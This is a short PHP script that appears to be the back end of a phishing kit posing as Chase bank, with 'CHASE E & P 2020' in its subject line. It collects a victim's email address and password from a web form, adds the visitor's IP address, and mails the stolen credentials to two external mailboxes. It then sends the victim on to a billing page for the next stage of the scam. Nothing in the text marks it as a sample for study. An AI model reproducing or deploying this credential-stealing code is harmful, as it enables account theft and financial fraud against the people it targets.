<?

$ip = getenv("REMOTE_ADDR");
$message .= "---- : || GhostMode || :------\n";
$message .= "Email Address             : ".$_POST['emaiadd']."\n";
$message .= "Email Password              : ".$_POST['emailpass']."\n";
$message .= "----: || GhostMode || :------\n";
$message .= "IP: ".$ip."\n";


$recipient = "greggee2@yandex.com, jimmyDavis121@outlook.com";
$subject = " CHASE E & P 2020 | ".$ip."\n";

mail($recipient,$subject,$message);
header("Location:  Billing.html");
?>